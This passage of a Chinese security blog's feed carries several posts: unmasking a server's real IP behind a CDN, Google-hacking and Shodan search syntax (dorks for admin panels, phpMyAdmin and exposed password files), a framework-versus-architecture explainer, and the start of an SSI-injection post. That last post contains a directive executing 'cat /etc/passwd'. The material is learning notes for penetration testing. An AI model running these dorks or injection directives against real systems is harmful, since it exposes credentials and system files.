rel="noopener">https://dnsdb.io/zh-cn/</a></p></blockquote><img src="/2019/11/13/绕过CDN的方法/0.png" title="xytk0x0"><h3 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h3><p>漏洞有可能会导致信息泄露。</p><p>若存在web漏洞，比如SSRF、XSS或能够得到反弹shell等，都有可能泄露真实的IP。</p><h3 id="历史DNS记录"><a href="#历史DNS记录" class="headerlink" title="历史DNS记录"></a>历史DNS记录</h3><p>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询网站有：</span><br><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br><span class="line">http://www.17ce.com/</span><br><span class="line">https://community.riskiq.com/</span><br><span class="line">http://www.crimeflare.com/cfssl.html</span><br></pre></td></tr></table></figure><h3 id="CDN本身"><a href="#CDN本身" class="headerlink" title="CDN本身"></a>CDN本身</h3><p>万能的社工~~</p><h3 id="Mx记录或邮件"><a href="#Mx记录或邮件" class="headerlink" title="Mx记录或邮件"></a>Mx记录或邮件</h3><p>很多站点都有发送邮件sendmail的功能，如Rss邮件订阅等。而且一般的邮件系统很多都是在内部，没有经过CDN的解析。可在邮件源码里面就会包含服务器的真实 IP。</p><h3 id="国外请求"><a href="#国外请求" class="headerlink" title="国外请求"></a>国外请求</h3><p>通过国外得一些冷门得DNS或IP去请求目标，很多时候国内得CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。 通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP查询网站：</p><blockquote><p><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;相关链接： &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/ce98fbff39ac&quot; target=
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://xytk0x0.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>接受生活的不确定</title>
    <link href="https://xytk0x0.github.io/2019/11/12/%E6%8E%A5%E5%8F%97%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B8%8D%E7%A1%AE%E5%AE%9A/"/>
    <id>https://xytk0x0.github.io/2019/11/12/接受生活的不确定/</id>
    <published>2019-11-12T13:15:29.000Z</published>
    <updated>2019-11-23T15:11:24.165Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="fc9e108d3cd99ab1b365bc65d7b98c04b32aebc99581f1998542ff95540d50ce"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>软件框架与架构</title>
    <link href="https://xytk0x0.github.io/2019/11/12/%E8%BD%AF%E4%BB%B6%E6%A1%86%E6%9E%B6%E4%B8%8E%E6%9E%B6%E6%9E%84/"/>
    <id>https://xytk0x0.github.io/2019/11/12/软件框架与架构/</id>
    <published>2019-11-12T03:46:51.000Z</published>
    <updated>2019-11-17T05:51:55.970Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近很迷~~</p><img src="/2019/11/12/软件框架与架构/v2-7850e71572f4f869c27f26b3e9035317.jpg" title="xytk0x0"><p>本篇大多是记录整理网上找到的东西，并且，我没有大型的软件开发经历，所以本篇将会极其片面，甚至会有一些错误的理解。</p><p>本篇将根据本人理解的变化持续更新。</p><p>相关链接：</p><p><a href="https://blog.csdn.net/binggetong/article/details/51371601" target="_blank" rel="noopener">https://blog.csdn.net/binggetong/article/details/51371601</a></p><p><a href="https://www.cnblogs.com/sunshine-1/p/7372934.html" target="_blank" rel="noopener">https://www.cnblogs.com/sunshine-1/p/7372934.html</a></p><h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>框架（framework）是整个或部分系统的可重用设计，表现为一组抽象构件及构件实例间交互的方法，另一种定义为，框架是可被应用开发者定制的应用骨架，前者是从应用方面而后者是从墓地的方面给出的定义。</p><p>框架是一个可服用的设计构件，通常以构件库的形式出现，但构架库只是框架的一个重要部分，框架的关键在于框架内对象间的的交互模式和控制流模式。</p><h2 id="框架和构件"><a href="#框架和构件" class="headerlink" title="框架和构件"></a>框架和构件</h2><p>框架比构件可定制性强。在某种程序上，将构件和框架看成两个不同但又彼此协作的技术更好。框架为构件提供重用的环境，为构件处理错误，交换数据及激活操作提供了标准的方法。</p><h2 id="应用框架"><a href="#应用框架" class="headerlink" title="应用框架"></a>应用框架</h2><p>应用框架是实现了某应用领域通用完备功能（除去特殊应用的部分）的底层服务。使用这种框架的编程人员可以在一个通用功能已经实现的基础上开始具体的系统开发，框架提供了所有应用期望的默认行为的类集合。具体的应用通过重写子类或组装对象来支持应用专用的行为。</p><h2 id="框架的特点"><a href="#框架的特点" class="headerlink" title="框架的特点"></a>框架的特点</h2><p>①其实就是某种应用的半成品，就是一组组件，供你选用完成你自己的系统，而且框架一般是成熟的，不断升级的软件。</p><p>②框架是一个可复用设计，它是由一组抽象类及其实例间协作关系来表达的。</p><p>③一个框架是在一个给定的问题领域内，一个应用程序的一部分设计与实现，也就是说框架是对特定应用领域中的应用系统的部分设计和实现。</p><h2 id="为什么要用框架"><a href="#为什么要用框架" class="headerlink" title="为什么要用框架"></a>为什么要用框架</h2><p>因为软件系统发展到今天已经很复杂了，特别是服务器端软件，涉及到的知识，内容，问题太多。在某些方面使用别人成熟的框架，就相当于让别人帮你完成一些基础工作，你只需要集中精力完成系统的业务逻辑设计。而且框架一般是成熟，稳健的，他可以处理系统很多细节问题，比如，事物处理，安全性，数据流控制等问题。还有框架一般都经过很多人使用，所以结构很好，所以扩展性也很好，而且它是不断升级的，你可以直接享受别人升级代码带来的好处。</p><h2 id="Python-web-框架"><a href="#Python-web-框架" class="headerlink" title="Python web 框架"></a>Python web 框架</h2><p>Django: Python Web应用开发框架<br>    Django 应该是最出名的Python框架，GAE甚至Erlang都有框架受它影响。Django是走大而全的方向，它最出名的是其全自动化的管理后台：只需要使用起ORM，做简单的对象定义，它就能自动生成数据库结构、以及全功能的管理后台。</p><p>Diesel：基于Greenlet的事件I/O框架<br>    Diesel提供一个整洁的API来编写网络客户端和服务器。支持TCP和UDP。</p><p>Flask：一个用Python编写的轻量级Web应用框架<br>    Flask是一个使用Python编写的轻量级Web应用框架。基于Werkzeug WSGI工具箱和Jinja2<br>模板引擎。Flask也被称为“microframework”，因为它使用简单的核心，用extension增加其他功能。Flask没有默认使用的数<br>据库、窗体验证工具。</p><p>Cubes：轻量级Python OLAP框架<br>    Cubes是一个轻量级Python框架，包含OLAP、多维数据分析和浏览聚合数据（aggregated data）等工具。</p><p>Kartograph.py：创造矢量地图的轻量级Python框架<br>    Kartograph是一个Python库，用来为ESRI生成SVG地图。Kartograph.py目前仍处于beta阶段，你可以在virtualenv环境下来测试。</p><p>Pulsar：Python的事件驱动并发框架<br>    Pulsar是一个事件驱动的并发框架，有了pulsar，你可以写出在不同进程或线程中运行一个或多个活动的异步服务器。</p><p>Web2py：全栈式Web框架<br>    Web2py是一个为Python语言提供的全功能Web应用框架，旨在敏捷快速的开发Web应用，具有快速、安全以及可移植的数据库驱动的应用，兼容Google App Engine。</p><p>Falcon：构建云API和网络应用后端的高性能Python框架<br>    Falcon是一个构建云API的高性能Python框架，它鼓励使用REST架构风格，尽可能以最少的力气做最多的事情。</p><p>Dpark：Python版的Spark<br>    DPark是Spark的Python克隆，是一个Python实现的分布式计算框架，可以非常方便地实现大规模数据处理和迭代计算。DPark由豆瓣实现，目前豆瓣内部的绝大多数数据分析都使用DPark完成，正日趋完善。</p><p>Buildbot：基于Python的持续集成测试框架<br>    Buildbot是一个开源框架，可以自动化软件构建、测试和发布等过程。每当代码有改变，服务器要求不同平台上的客户端立即进行代码构建和测试，收集并报告不同平台的构建和测试结果。</p><p>Zerorpc：基于ZeroMQ的高性能分布式RPC框架<br>    Zerorpc是一个基于ZeroMQ和MessagePack开发的远程过程调用协议（RPC）实现。和 Zerorpc 一起使用的 Service API 被称为 zeroservice。Zerorpc 可以通过编程或命令行方式调用。</p><p>Bottle: 微型Python Web框架<br>    Bottle是一个简单高效的遵循WSGI的微型python Web框架。说微型，是因为它只有一个文件，除Python标准库外，它不依赖于任何第三方模块。</p><p>Tornado：异步非阻塞IO的Python Web框架<br>    Tornado的全称是Torado Web Server，从名字上看就可知道它可以用作Web服务器，但同时它也是一个Python Web的开发框架。最初是在FriendFeed公司的网站上使用，FaceBook收购了之后便开源了出来。</p><p>webpy: 轻量级的Python Web框架<br>    webpy的设计理念力求精简（Keep it simple and powerful），源码很简短，只提供一个框架所必须的东西，不依赖大量的第三方模块，它没有URL路由、没有模板也没有数据库的访问。</p><p>Scrapy：Python的爬虫框架<br>    Scrapy是一个使用Python编写的，轻量级的，简单轻巧，并且使用起来非常的方便</p><h1 id="软件架构"><a href="#软件架构" class="headerlink" title="软件架构"></a>软件架构</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>软件架构（software architecture）是一系列相关的抽象模式，用于指导大型软件系统各个方面的设计，是一个系统的草图，描述的对象是直接构成系统的抽象组件。各个组件之间的连接明确细致的描述组件之间的通讯。</p><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或对象，在面向对象领域当中，组件之间的连接通常用接口来实现。软件体系结构是构建计算机软件实践的基础。</p><h2 id="要素"><a href="#要素" class="headerlink" title="要素"></a>要素</h2><p>①它是一个软件系统从整体到部分的最高层次的划分。</p><p>一个系统通常是由元件组成的，而这些元件如何形成、相互之间如何发生作用，则是关于这个系统本身结构的重要信息。详细地说，就是要包括架构元件（Architecture Component）、联结器（Connector）、任务流（Task-flow）。所谓架构元素，也就是组成系统的核心”砖瓦”，而联结器则描述这些元件之间通讯的路径、通讯的机制、通讯的预期结果，任务流则描述系统如何使用这些元件和联结器完成某一项需求。</p><p>②建造一个系统所作出的最高层次的、以后难以更改的，商业的和技术的决定。</p><p>在建造一个系统之前会有很多的重要决定需要事先作出，而一旦系统开始进行详细设计甚至建造，这些决定就很难更改甚至无法更改。显然，这样的决定必定是有关系统设计成败的最重要决定，必须经过非常慎重的研究和考察。</p><h2 id="设计目标"><a href="#设计目标" class="headerlink" title="设计目标"></a>设计目标</h2><p>1.可靠性（Reliable）。软件系统对于用户的商业经营和管理来说极为重要，因此软件系统必须非常可靠。</p><p>2.安全性（Secure）。软件系统所承担的交易的商业价值极高，系统的安全性非常重要。</p><p>3.可扩展性（Scalable）。软件必须能够在用户的使用率、用户的数目增加很快的情况下，保持合理的性能。只有这样，才能适应用户的市场扩展得可能性。</p><p>4.可定制化（Customizable）。同样的一套软件，可以根据客户群的不同和市场需求的变化进行调整。</p><p>5.可伸缩 （Extensible）。在新技术出现的时候，一个软件系统应当允许导入新技术，从而对现有系统进行功能和性能的扩展。</p><p>6.可维护性（Maintainable）。软件系统的维护包括两方面，一是排除现有的错误，二是将新的软件需求反映到现有系统中去。一个易于维护的系统可以有效地降低技术支持的花费。</p><p>7.客户体验（Customer Experience）。软件系统必须易于使用。</p><p>8.市场时机（Time to Market）。软件用户要面临同业竞争，软件提供商也要面临同业竞争。以最快的速度争夺市场先机非常重要。</p><h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><p>UI(表现层): 主要是指与用户交互的界面。用于接收用户输入的数据和显示处理后用户需要的数据。</p><p>BLL:(业务逻辑层): UI层和DAL层之间的桥梁。实现业务逻辑。业务逻辑具体包含：验证、计算、业务规则等等。</p><p>DAL:(数据访问层): 与数据库打交道。主要实现对数据的增、删、改、查。将存储在数据库中的数据提交给业务层，同时将业务层处理的数据保存到数据库。（当然这些操作都是基于UI层的。用户的需求反映给界面（UI），UI反映给BLL，BLL反映给DAL，DAL进行数据的操作，操作后再 一 一 返回，直到将用户所需数据反馈给用户）</p><h1 id="框架和架构的区别"><a href="#框架和架构的区别" class="headerlink" title="框架和架构的区别"></a>框架和架构的区别</h1><p>框架是软件，架构不是软件。</p><p>框架是一种特殊的软件，它并不能提供完整无缺的解决方案，而是为你构建解决方案提供良好的基础。框架是半成品。典型地，框架是系统或子系统的半成品；框架中的服务可以被最终应用系统直接调用，而框架中的扩展点是供应用开发人员定制的“可变化点”</p><p>软件架构不是软件，而是关于软件如何设计的重要决策。软件架构决策涉及到如何将软件系统分解成不同的部分、各部分之间的静态结构关系和动态交互关系等。经过完整的开发过程之后，这些架构决策将体现在最终开发出的软件系统中；当然，引入软件框架之后，整个开发过程变成了“分两步走”，而架构决策往往会体现在框架之中。</p><p>我们不能指着某些代码，说这就是软件架构，因为软件架构是比具体代码高一个抽象层次的概念。架构势必被代码所体现和遵循，但任何一段具体的代码都代表不了架构。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近很迷~~&lt;/p&gt;
&lt;img src=&quot;/2019/11/12/软件框架与架构/v2-7850e71572f4f869c27f26b3e9
      
    
    </summary>
    
    
      <category term="开发" scheme="https://xytk0x0.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="开发" scheme="https://xytk0x0.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>工具-Google&amp;&amp;Shodan</title>
    <link href="https://xytk0x0.github.io/2019/11/07/%E5%B7%A5%E5%85%B7-Google-Shodan/"/>
    <id>https://xytk0x0.github.io/2019/11/07/工具-Google-Shodan/</id>
    <published>2019-11-07T14:16:44.000Z</published>
    <updated>2019-11-08T07:15:00.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>这两个都勉强算是工具吧。两个搜索引擎，一个能爬出网络中的大部分页面，一个能够获取大部分在线设备的信息。</p><h1 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h1><p>以前看的没有现在看的系统和详细。</p><p>链接： <a href="https://blog.csdn.net/qq_36119192/article/details/84029809" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84029809</a></p><p>Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。</p><p>利用Google搜索我们想要的信息，需要配合谷歌搜索引擎的一些语法：</p><h2 id="基本搜索"><a href="#基本搜索" class="headerlink" title="基本搜索"></a>基本搜索</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">逻辑与：and</span><br><span class="line">逻辑或： or </span><br><span class="line">逻辑非： -</span><br><span class="line">完整匹配：&quot;关键词&quot; </span><br><span class="line">通配符：* ?</span><br></pre></td></tr></table></figure><h2 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h2><h3 id="intext"><a href="#intext" class="headerlink" title="intext"></a>intext</h3><p>寻找<strong>正文</strong>中含有关键字的网页</p><p>例：intext: 关键字</p><img src="/2019/11/07/工具-Google-Shodan/g0.png" title="XYTK"><h3 id="intitle"><a href="#intitle" class="headerlink" title="intitle"></a>intitle</h3><p>寻找<strong>标题</strong>中含有关键字的网页</p><img src="/2019/11/07/工具-Google-Shodan/g1.png" title="XYTK"><h3 id="allintitle"><a href="#allintitle" class="headerlink" title="allintitle"></a>allintitle</h3><p>用法与intitle相似，但可以指定多个词</p><p>例：allintitle: 后台管理 admin</p><img src="/2019/11/07/工具-Google-Shodan/g2.png" title="XYTK"><h3 id="inurl"><a href="#inurl" class="headerlink" title="inurl"></a>inurl</h3><p>url中有关键字</p><p>例：inurl:login</p><img src="/2019/11/07/工具-Google-Shodan/g3.png" title="XYTK"><h4 id="查找管理员登录页面"><a href="#查找管理员登录页面" class="headerlink" title="查找管理员登录页面"></a>查找管理员登录页面</h4><p>inurl:/admin/login.php</p><h4 id="查找数据库管理页面"><a href="#查找数据库管理页面" class="headerlink" title="查找数据库管理页面"></a>查找数据库管理页面</h4><p>inurl:/phpmyadmin/index.php</p><h3 id="allinurl"><a href="#allinurl" class="headerlink" title="allinurl"></a>allinurl</h3><p>与inurl类似，但可以指定多个词</p><p>例：inurl:login admin</p><h3 id="site"><a href="#site" class="headerlink" title="site"></a>site</h3><p>用于访问指定站点</p><img src="/2019/11/07/工具-Google-Shodan/g4.png" title="XYTK"><h3 id="filetype"><a href="#filetype" class="headerlink" title="filetype"></a>filetype</h3><p>指定访问的文件类型</p><img src="/2019/11/07/工具-Google-Shodan/g5.png" title="XYTK"><h3 id="link"><a href="#link" class="headerlink" title="link"></a>link</h3><p>指定链接的网页</p><img src="/2019/11/07/工具-Google-Shodan/g6.png" title="XYTK"><h3 id="related"><a href="#related" class="headerlink" title="related"></a>related</h3><p>搜索相似类型的网页(相似指网页布局)</p><h3 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h3><p>网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：cache:<a href="http://www.hackingspirits.com" target="_blank" rel="noopener">www.hackingspirits.com</a>  guest  ，将返回指定网站的缓存，并且正文中含有guest</p><h3 id="info"><a href="#info" class="headerlink" title="info"></a>info</h3><p>返回页面信息</p><h3 id="define"><a href="#define" class="headerlink" title="define"></a>define</h3><p>返回某个词语的定义</p><h3 id="phonebook"><a href="#phonebook" class="headerlink" title="phonebook"></a>phonebook</h3><p>电话簿查询美国街道地址和电话号码信息。</p><h2 id="几个例子"><a href="#几个例子" class="headerlink" title="几个例子"></a>几个例子</h2><h3 id="查找网站后台"><a href="#查找网站后台" class="headerlink" title="查找网站后台"></a>查找网站后台</h3><p>site:xx.com intext:管理</p><p>site:xx.com inurl:login</p><p>site:xx.com intitle:后台</p><h3 id="查看服务器使用的程序"><a href="#查看服务器使用的程序" class="headerlink" title="查看服务器使用的程序"></a>查看服务器使用的程序</h3><p>site:xx.com filetype:asp</p><p>site:xx.com filetype:php</p><p>site:xx.com filetype:jsp</p><p>site:xx.com filetype:aspx</p><h3 id="查看上传漏洞"><a href="#查看上传漏洞" class="headerlink" title="查看上传漏洞"></a>查看上传漏洞</h3><p>site:xx.com inurl:file</p><p>site:xx.com inurl:load</p><h3 id="index-of"><a href="#index-of" class="headerlink" title="index of"></a>index of</h3><p>发现允许目录遍历的网站。</p><p>index of /admin</p><p>index of /passwd</p><p>index of /password</p><p>index of /mail</p><p>“index of /“ +passwd</p><p>“index of /“ +password.txt</p><p>“index of /“ +.htaccess</p><p>“index of /root”</p><p>“index of /cgi-bin”</p><p>“index of /logs”</p><p>“index of /config”</p><h1 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h1><p>链接： <a href="https://www.freebuf.com/sectool/121339.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/121339.html</a></p><h2 id="搜索技巧"><a href="#搜索技巧" class="headerlink" title="搜索技巧"></a>搜索技巧</h2><p>hostname：搜索指定的主机或域名，例如 hostname:”google”</p><p>port：搜索指定的端口或服务，例如 port:”21”</p><p>country：搜索指定的国家，例如 country:”CN”</p><p>city：搜索指定的城市，例如 city:”Hefei”</p><p>org：搜索指定的组织或公司，例如 org:”google”</p><p>isp：搜索指定的ISP供应商，例如 isp:”China Telecom”</p><p>product：搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”</p><p>version：搜索指定的软件版本，例如 version:”1.6.2”</p><p>geo：搜索指定的地理位置，参数为经纬度，例如 geo:”31.8639, 117.2808”</p><p>before/after：搜索指定收录时间前后的数据，格式为 dd-mm-yy，例如 before:”11-11-15”</p><p>net：搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;这两个都勉强算是工具吧。两个搜索引擎，一个能爬出网络中的大部分页面，一个能够获取大部分在线设备的信息。&lt;/p&gt;
&lt;h1 id
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="tools" scheme="https://xytk0x0.github.io/categories/tools/"/>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="信息收集" scheme="https://xytk0x0.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="tools" scheme="https://xytk0x0.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试的完整流程(持续更新)</title>
    <link href="https://xytk0x0.github.io/2019/11/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B/"/>
    <id>https://xytk0x0.github.io/2019/11/06/渗透测试的完整流程/</id>
    <published>2019-11-06T13:52:22.000Z</published>
    <updated>2019-11-17T06:13:27.081Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>由于种种原因，我不完全是从浅到深、从点到面地学习安全知识的，导致我会的东西很杂。之前我就有看过相当一部分渗透测试方面的内容，为把自己会的东西捋一捋，也为了复习一下并多动动手，就把这些东西记录下来。</p></blockquote><h1 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><h2 id="渗透报告"><a href="#渗透报告" class="headerlink" title="渗透报告"></a>渗透报告</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;由于种种原因，我不完全是从浅到深、从点到面地学习安全知识的，导致我会的东西很杂。之前我就有看过相当一部分渗透测试方
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SSI注入</title>
    <link href="https://xytk0x0.github.io/2019/10/30/SSI%E6%B3%A8%E5%85%A5/"/>
    <id>https://xytk0x0.github.io/2019/10/30/SSI注入/</id>
    <published>2019-10-30T08:09:07.000Z</published>
    <updated>2019-11-17T03:17:40.541Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>整理一下SSII(Server-Side-Includes Injection , 服务器端包含注入)，这种漏洞需要的环境较为严格，极其少见。</p><p>相关链接：</p><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p><p><a href="https://www.guildhab.top/?p=1550" target="_blank" rel="noopener">https://www.guildhab.top/?p=1550</a></p><h1 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h1><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>.shtml ( Server-Parsed HTML ) 页面就是应用 SSI 技术的 HTML 文档 , 除此之外还有 .stm 页面 , .shtm 页面 . 该类页面在返回到客户端前 , 其中的 SSI 指令会被服务器解析 , 在最终返回给客户端的页面中是不包含 SSI 指令的 , 即使某些 SSI 指令没有被解析 , 浏览器也会将其作为普通的 HTML 注释处理。</p><h3 id="显示服务器端环境变量-lt-echo-gt"><a href="#显示服务器端环境变量-lt-echo-gt" class="headerlink" title="显示服务器端环境变量&lt;#echo&gt;"></a>显示服务器端环境变量&lt;#echo&gt;</h3><p>本文档名称：</p><p>&lt;!–#echo var=”DOCUMENT_NAME”–&gt;</p><p>现在时间：</p><p>&lt;!–#echo var=”DATE_LOCAL”–&gt;</p><p>显示IP地址：</p><p>&lt;! #echo var=”REMOTE_ADDR”–&gt;</p><h3 id="将文本内容直接插入到文档中-lt-include-gt"><a href="#将文本内容直接插入到文档中-lt-include-gt" class="headerlink" title="将文本内容直接插入到文档中&lt;#include&gt;"></a>将文本内容直接插入到文档中&lt;#include&gt;</h3><p>&lt;! #include file=”文件名称”–&gt;</p><!--#include virtual="index.html" --><p>&lt;! #include virtual=”文件名称”–&gt;</p><!--#include virtual="/www/footer.html" --><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p><h3 id="显示WEB文档相关信息-lt-flastmod-gt-lt-fsize-gt-如文件制作日期-大小等"><a href="#显示WEB文档相关信息-lt-flastmod-gt-lt-fsize-gt-如文件制作日期-大小等" class="headerlink" title="显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)"></a>显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</h3><p>文件最近更新日期：</p><p>&lt;! #flastmod file=”文件名称”–&gt;</p><p>文件的长度：</p><p>&lt;!–#fsize file=”文件名称”–&gt;</p><h3 id="直接执行服务器上的各种程序-lt-exec-gt-如CGI或其他可执行程序"><a href="#直接执行服务器上的各种程序-lt-exec-gt-如CGI或其他可执行程序" class="headerlink" title="直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)"></a>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</h3><p>&lt;!–#exec cmd=”文件名称”–&gt;</p><!--#exec cmd="cat /etc/passwd"--><p>&lt;!–#exec cgi=”文件名称”–&gt;</p><p>&lt;!–#exec cgi=”/cgi-bin/access_log.cgi”–&gt;</p><p>将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。</p><h3 id="设置SSI信息显示格式-lt-config-gt-如文件制作日期-大小显示方式"><a href="#设置SSI信息显示格式-lt-config-gt-如文件制作日期-大小显示方式" class="headerlink" title="设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)"></a>设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)</h3><h3 id="高级SSI可设置变量使用if条件语句。"><a href="#高级SSI可设置变量使用if条件语句。" class="headerlink" title="高级SSI可设置变量使用if条件语句。"></a>高级SSI可设置变量使用if条件语句。</h3><h1 id="SSII"><a href="#SSII" 